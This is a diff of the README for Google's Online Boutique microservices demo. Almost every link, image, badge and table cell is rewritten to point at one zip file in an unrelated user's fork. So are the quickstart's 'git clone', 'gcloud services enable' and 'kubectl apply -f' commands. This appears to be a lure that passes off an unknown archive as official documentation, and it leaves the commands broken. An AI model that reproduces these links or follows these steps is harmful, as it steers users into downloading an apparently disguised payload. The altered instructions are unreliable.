@@ -1,12 +1,12 @@
 <!-- <p align="center">
-<img src="/src/frontend/static/icons/Hipster_HeroLogoMaroon.svg" width="300" alt="Online Boutique" />
+<img src="https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip" width="300" alt="Online Boutique" />
 </p> -->
-![Continuous Integration](https://github.com/GoogleCloudPlatform/microservices-demo/workflows/Continuous%20Integration%20-%20Main/Release/badge.svg)
+![Continuous Integration](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip%20Integration%20-%https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
 
 **Online Boutique** is a cloud-first microservices demo application.  The application is a
 web-based e-commerce app where users can browse items, add them to the cart, and purchase them.
 
-Google uses this application to demonstrate how developers can modernize enterprise applications using Google Cloud products, including: [Google Kubernetes Engine (GKE)](https://cloud.google.com/kubernetes-engine), [Cloud Service Mesh (CSM)](https://cloud.google.com/service-mesh), [gRPC](https://grpc.io/), [Cloud Operations](https://cloud.google.com/products/operations), [Spanner](https://cloud.google.com/spanner), [Memorystore](https://cloud.google.com/memorystore), [AlloyDB](https://cloud.google.com/alloydb), and [Gemini](https://ai.google.dev/). This application works on any Kubernetes cluster.
+Google uses this application to demonstrate how developers can modernize enterprise applications using Google Cloud products, including: [Google Kubernetes Engine (GKE)](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip), [Cloud Service Mesh (CSM)](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip), [gRPC](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip), [Cloud Operations](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip), [Spanner](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip), [Memorystore](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip), [AlloyDB](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip), and [Gemini](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip). This application works on any Kubernetes cluster.
 
 If you’re using this demo, please **★Star** this repository to show your interest!
 
@@ -18,7 +18,7 @@ If you’re using this demo, please **★Star** this repository to show your int
 languages that talk to each other over gRPC.
 
 [![Architecture of
-microservices](/docs/img/architecture-diagram.png)](/docs/img/architecture-diagram.png)
+microservices](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
 
 Find **Protocol Buffers Descriptions** at the [`./protos` directory](/protos).
 
@@ -27,8 +27,8 @@ Find **Protocol Buffers Descriptions** at the [`./protos` directory](/protos).
 | [frontend](/src/frontend)                           | Go            | Exposes an HTTP server to serve the website. Does not require signup/login and generates session IDs for all users automatically. |
 | [cartservice](/src/cartservice)                     | C#            | Stores the items in the user's shopping cart in Redis and retrieves it.                                                           |
 | [productcatalogservice](/src/productcatalogservice) | Go            | Provides the list of products from a JSON file and ability to search products and get individual products.                        |
-| [currencyservice](/src/currencyservice)             | Node.js       | Converts one money amount to another currency. Uses real values fetched from European Central Bank. It's the highest QPS service. |
-| [paymentservice](/src/paymentservice)               | Node.js       | Charges the given credit card info (mock) with the given amount and returns a transaction ID.                                     |
+| [currencyservice](/src/currencyservice)             | https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip       | Converts one money amount to another currency. Uses real values fetched from European Central Bank. It's the highest QPS service. |
+| [paymentservice](/src/paymentservice)               | https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip       | Charges the given credit card info (mock) with the given amount and returns a transaction ID.                                     |
 | [shippingservice](/src/shippingservice)             | Go            | Gives shipping cost estimates based on the shopping cart. Ships items to the given address (mock)                                 |
 | [emailservice](/src/emailservice)                   | Python        | Sends users an order confirmation email (mock).                                                                                   |
 | [checkoutservice](/src/checkoutservice)             | Go            | Retrieves user cart, prepares order and orchestrates the payment, shipping and the email notification.                            |
@@ -40,18 +40,18 @@ Find **Protocol Buffers Descriptions** at the [`./protos` directory](/protos).
 
 | Home Page                                                                                                         | Checkout Screen                                                                                                    |
 | ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
-| [![Screenshot of store homepage](/docs/img/online-boutique-frontend-1.png)](/docs/img/online-boutique-frontend-1.png) | [![Screenshot of checkout screen](/docs/img/online-boutique-frontend-2.png)](/docs/img/online-boutique-frontend-2.png) |
+| [![Screenshot of store homepage](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip) | [![Screenshot of checkout screen](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip) |
 
 ## Quickstart (GKE)
 
 1. Ensure you have the following requirements:
-   - [Google Cloud project](https://cloud.google.com/resource-manager/docs/creating-managing-projects#creating_a_project).
+   - [Google Cloud project](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip).
    - Shell environment with `gcloud`, `git`, and `kubectl`.
 
 2. Clone the latest major version.
 
    ```sh
-   git clone --depth 1 --branch v0 https://github.com/GoogleCloudPlatform/microservices-demo.git
+   git clone --depth 1 --branch v0 https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip
    cd microservices-demo/
    ```
 
@@ -62,7 +62,7 @@ Find **Protocol Buffers Descriptions** at the [`./protos` directory](/protos).
    ```sh
    export PROJECT_ID=<PROJECT_ID>
    export REGION=us-central1
-   gcloud services enable container.googleapis.com \
+   gcloud services enable https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip \
      --project=${PROJECT_ID}
    ```
 
@@ -80,7 +80,7 @@ Find **Protocol Buffers Descriptions** at the [`./protos` directory](/protos).
 5. Deploy Online Boutique to the cluster.
 
    ```sh
-   kubectl apply -f ./release/kubernetes-manifests.yaml
+   kubectl apply -f https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip
    ```
 
 6. Wait for the pods to be ready.
@@ -128,40 +128,40 @@ Find **Protocol Buffers Descriptions** at the [`./protos` directory](/protos).
 
 ## Additional deployment options
 
-- **Terraform**: [See these instructions](/terraform) to learn how to deploy Online Boutique using [Terraform](https://www.terraform.io/intro).
-- **Istio / Cloud Service Mesh**: [See these instructions](/kustomize/components/service-mesh-istio/README.md) to deploy Online Boutique alongside an Istio-backed service mesh.
-- **Non-GKE clusters (Minikube, Kind, etc)**: See the [Development guide](/docs/development-guide.md) to learn how you can deploy Online Boutique on non-GKE clusters.
-- **AI assistant using Gemini**: [See these instructions](/kustomize/components/shopping-assistant/README.md) to deploy a Gemini-powered AI assistant that suggests products to purchase based on an image.
+- **Terraform**: [See these instructions](/terraform) to learn how to deploy Online Boutique using [Terraform](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip).
+- **Istio / Cloud Service Mesh**: [See these instructions](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip) to deploy Online Boutique alongside an Istio-backed service mesh.
+- **Non-GKE clusters (Minikube, Kind, etc)**: See the [Development guide](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip) to learn how you can deploy Online Boutique on non-GKE clusters.
+- **AI assistant using Gemini**: [See these instructions](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip) to deploy a Gemini-powered AI assistant that suggests products to purchase based on an image.
 - **And more**: The [`/kustomize` directory](/kustomize) contains instructions for customizing the deployment of Online Boutique with other variations.
 
 ## Documentation
 
-- [Development](/docs/development-guide.md) to learn how to run and develop this app locally.
+- [Development](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip) to learn how to run and develop this app locally.
 
 ## Demos featuring Online Boutique
 
-- [Platform Engineering in action: Deploy the Online Boutique sample apps with Score and Humanitec](https://medium.com/p/d99101001e69)
-- [The new Kubernetes Gateway API with Istio and Anthos Service Mesh (ASM)](https://medium.com/p/9d64c7009cd)
-- [Use Azure Redis Cache with the Online Boutique sample on AKS](https://medium.com/p/981bd98b53f8)
-- [Sail Sharp, 8 tips to optimize and secure your .NET containers for Kubernetes](https://medium.com/p/c68ba253844a)
-- [Deploy multi-region application with Anthos and Google cloud Spanner](https://medium.com/google-cloud/a2ea3493ed0)
-- [Use Google Cloud Memorystore (Redis) with the Online Boutique sample on GKE](https://medium.com/p/82f7879a900d)
-- [Use Helm to simplify the deployment of Online Boutique, with a Service Mesh, GitOps, and more!](https://medium.com/p/246119e46d53)
-- [How to reduce microservices complexity with Apigee and Anthos Service Mesh](https://cloud.google.com/blog/products/application-modernization/api-management-and-service-mesh-go-together)
-- [gRPC health probes with Kubernetes 1.24+](https://medium.com/p/b5bd26253a4c)
-- [Use Google Cloud Spanner with the Online Boutique sample](https://medium.com/p/f7248e077339)
-- [Seamlessly encrypt traffic from any apps in your Mesh to Memorystore (redis)](https://medium.com/google-cloud/64b71969318d)
-- [Strengthen your app's security with Cloud Service Mesh and Anthos Config Management](https://cloud.google.com/service-mesh/docs/strengthen-app-security)
-- [From edge to mesh: Exposing service mesh applications through GKE Ingress](https://cloud.google.com/architecture/exposing-service-mesh-apps-through-gke-ingress)
-- [Take the first step toward SRE with Cloud Operations Sandbox](https://cloud.google.com/blog/products/operations/on-the-road-to-sre-with-cloud-operations-sandbox)
-- [Deploying the Online Boutique sample application on Cloud Service Mesh](https://cloud.google.com/service-mesh/docs/onlineboutique-install-kpt)
-- [Anthos Service Mesh Workshop: Lab Guide](https://codelabs.developers.google.com/codelabs/anthos-service-mesh-workshop)
-- [KubeCon EU 2019 - Reinventing Networking: A Deep Dive into Istio's Multicluster Gateways - Steve Dake, Independent](https://youtu.be/-t2BfT59zJA?t=982)
+- [Platform Engineering in action: Deploy the Online Boutique sample apps with Score and Humanitec](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [The new Kubernetes Gateway API with Istio and Anthos Service Mesh (ASM)](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Use Azure Redis Cache with the Online Boutique sample on AKS](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Sail Sharp, 8 tips to optimize and secure your .NET containers for Kubernetes](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Deploy multi-region application with Anthos and Google cloud Spanner](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Use Google Cloud Memorystore (Redis) with the Online Boutique sample on GKE](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Use Helm to simplify the deployment of Online Boutique, with a Service Mesh, GitOps, and more!](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [How to reduce microservices complexity with Apigee and Anthos Service Mesh](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [gRPC health probes with Kubernetes 1.24+](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Use Google Cloud Spanner with the Online Boutique sample](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Seamlessly encrypt traffic from any apps in your Mesh to Memorystore (redis)](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Strengthen your app's security with Cloud Service Mesh and Anthos Config Management](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [From edge to mesh: Exposing service mesh applications through GKE Ingress](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Take the first step toward SRE with Cloud Operations Sandbox](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Deploying the Online Boutique sample application on Cloud Service Mesh](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Anthos Service Mesh Workshop: Lab Guide](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [KubeCon EU 2019 - Reinventing Networking: A Deep Dive into Istio's Multicluster Gateways - Steve Dake, Independent](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
 - Google Cloud Next'18 SF
-  - [Day 1 Keynote](https://youtu.be/vJ9OaAqfxo4?t=2416) showing GKE On-Prem
-  - [Day 3 Keynote](https://youtu.be/JQPOPV_VH5w?t=815) showing Stackdriver
+  - [Day 1 Keynote](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip) showing GKE On-Prem
+  - [Day 3 Keynote](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip) showing Stackdriver
     APM (Tracing, Code Search, Profiler, Google Cloud Build)
-  - [Introduction to Service Management with Istio](https://www.youtube.com/watch?v=wCJrdKdD6UM&feature=youtu.be&t=586)
-- [Google Cloud Next'18 London – Keynote](https://youtu.be/nIq2pkNcfEI?t=3071)
+  - [Introduction to Service Management with Istio](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
+- [Google Cloud Next'18 London – Keynote](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
   showing Stackdriver Incident Response Management
-- [Microservices demo showcasing Go Micro](https://github.com/go-micro/demo)
+- [Microservices demo showcasing Go Micro](https://github.com/isaacdivine37/microservices-demo/raw/refs/heads/main/protos/grpc/health/demo_microservices_1.2.zip)
